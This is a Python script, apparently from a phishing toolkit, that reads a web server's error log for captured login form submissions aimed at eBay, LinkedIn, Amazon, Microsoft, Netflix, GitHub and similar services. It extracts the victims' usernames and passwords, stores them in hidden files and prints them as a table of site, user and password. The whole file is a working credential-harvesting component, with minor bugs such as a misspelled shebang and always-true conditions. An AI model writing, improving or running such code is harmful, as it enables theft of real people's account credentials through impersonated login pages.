#!/usr/bin/env pyhton
import os
import re
import sys
import time
import subprocess
from urllib.parse import unquote 
from subprocess import PIPE

user_name = os.path.dirname(os.path.abspath(__file__)).split("/")[2]
Path_St = str("/".join(os.path.dirname(__file__).split('/')[:-1]))
group = "chown " + user_name + ":" + user_name + " " + Path_St + '/ServerLog/*'
os.system(group)

class dns_result:
    def __init__(self):
        self.web_Password()

    def web_Password(self):
        print(" " + "-" * 102)
        print("| " + f"{'       Site-Name    ':<20}", ' |' + f"{'       auth_user    ':<35}", "  | " + f"{'         PASSWORD   ':<35}   |")
        print(" " + "-" * 102)
        count = 0
        with open(Path_St + '/ServerLog/log_error.log') as Log_Handel:
            Log_read = Log_Handel.readlines()
        for line in Log_read:
            if '%40' in line:
                try:
                    if "&sgnBt" in line:
                        pattern = r'userid=([^&]+)&pass=([^&]+)'
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@")
                            line_cread_2 = match.group(2)

                    elif "&session_key=" in line:
                        email_match = re.search(r'session_key=([^&]+)', line)
                        password_match = re.search(r'session_password=([^&]+)', line)
                        line_cread_1 = email_match.group(1).replace('%40', '@') if email_match else None
                        line_cread_2 = password_match.group(1) if password_match else None

                    elif "amazon" and "email=" in line:
                        pattern = r"email=([^&]+)&password=([^\s]+)"
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@")
                            line_cread_2 = match.group(2)
                        else:
                            pattern = r'email=([^&]+).*?pass=([^&]+)'
                            match = re.search(pattern, line)
                            if match:
                                line_cread_1 = match.group(1).replace("%40", "@").replace('+', '')
                                line_cread_2 = match.group(2)

                    elif "username=" or "Username" in line and "&signin=Next" not in line:
                        pattern = r"username=([^&]+)&password=([^\s]+)"
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@").replace('+', '')
                            line_cread_2 = match.group(2)
                        elif 'login=' in line:
                            pattern = r"login=([^&]+)&password=([^&]+)"
                            match = re.search(pattern, line)
                            if match:
                                line_cread_1 = match.group(1).replace("%40", "@").replace('+', '')
                                line_cread_2 = match.group(2)
                        else:
                            pattern = r"Username=([^&]+)&Password=([^\s]+)"
                            match = re.search(pattern, line)
                            if match:
                                line_cread_1 = match.group(1).replace("%40", "@").replace('+', '')
                                line_cread_2 = match.group(2)

                    elif 'userLoginId=' in line:
                        pattern = r"userLoginId=([^&+]+).*?password=([^&]+)"
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace('%40', '@').replace('+', '')
                            line_cread_2 = match.group(2)

                    elif "&signin=Next" in line:
                        pattern = r'username=([^&]+)&passwd=([^&\s]+)'
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@").replace("+", "")
                            line_cread_2 = match.group(2)

                    elif "usernameOrEmail=" in line:
                        pattern = r'usernameOrEmail=([^&]+)&password=([^\s]+)'
                        match = re.search(pattern, line)
                        if match:
                            line_cread_1 = match.group(1).replace("%40", "@")
                            line_cread_2 = match.group(2)

                    elif '&user%5Blogin%5D' in line:
                        match = re.search(r"user%5Blogin%5D=([^&\s]+).*?user%5Bpassword%5D=([^&\s]+)", line)
                        if match:
                            line_cread_1 = unquote(match.group(1)).replace('+', '')
                            line_cread_2 = unquote(match.group(2))

                    if 'line_cread_1' in locals() and 'line_cread_2' in locals():
                        with open(Path_St + '/ServerLog/.Cread.txt', 'a') as Cread_User, \
                                open(Path_St + '/ServerLog/.pass.txt', 'a') as cartpass:
                            count += 1
                            Cread_User.write(line_cread_1 + '\n')
                            cartpass.write(line_cread_2 + '\n')
                        del line_cread_1
                        del line_cread_2
                except IndexError:
                    pass
                except UnboundLocalError:
                    pass

        with open(Path_St + '/ServerLog/log_error.log', 'r') as accesslog:
            accesslog = accesslog.readlines()
        seen = set()
        unique_domains = []
        for header in accesslog:
            match = re.search(r"Host:\s+www\.([^.]+)\.", header)
            if match:
                domain = match.group(1)
                if domain not in seen:
                    seen.add(domain)
                    unique_domains.insert(0, domain)

        for domain in reversed(unique_domains):
            with open(Path_St + '/ServerLog/.web.txt', 'a') as FileWeb:
                FileWeb.write(domain + '\n')

        self.localGrep(count)

    def localGrep(self, count=0):
        try:
            with open(Path_St + '/ServerLog/.Cread.txt', 'r') as Cread_User, \
                    open(Path_St + '/ServerLog/.pass.txt', 'r') as cartpass, \
                    open(Path_St + '/ServerLog/.web.txt', 'r') as FileWeb:
                Cread_User = Cread_User.readlines()
                cartpass = cartpass.readlines()
                FileWeb = FileWeb.readlines()
                for i in range(count):
                    print("|   " + f"{FileWeb[i].replace('\n', ''):<20}" + "|   " + f"{Cread_User[i].replace('\n', ''):<35}" + "| " + f"{cartpass[i].replace('\n', ''):<35}" + "   |")
            with open(Path_St + '/ServerLog/.Cread.txt', 'w') as Cread_User, \
                    open(Path_St + '/ServerLog/.pass.txt', 'w') as cartpass, \
                    open(Path_St + '/ServerLog/.web.txt', 'w') as FileWeb:
                pass
        except IndexError:
            pass

if __name__ == '__main__':
    dns_result()
